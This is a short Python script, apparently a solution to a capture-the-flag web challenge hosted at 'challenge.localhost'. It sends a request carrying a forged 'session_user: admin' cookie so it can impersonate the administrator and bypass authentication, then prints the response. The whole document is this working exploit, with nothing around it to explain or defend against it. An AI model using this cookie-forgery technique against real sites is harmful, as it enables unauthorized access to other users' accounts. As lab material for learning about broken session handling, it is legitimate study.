import requests
import urllib.parse

method = "GET"
site = "http://challenge.localhost"
port = 80

# Construct the URL.
url = f"{site}:{port}/"

# Set required headers.
headers = {'Content-Type':'application/x-www-form-urlencoded'}

# Forge the cookies to impersonate the admin user.
cookies = {'session_user': 'admin'}

response = requests.request(method, url, headers = headers, cookies = cookies)

print(f"\nResponse: {response.text}")
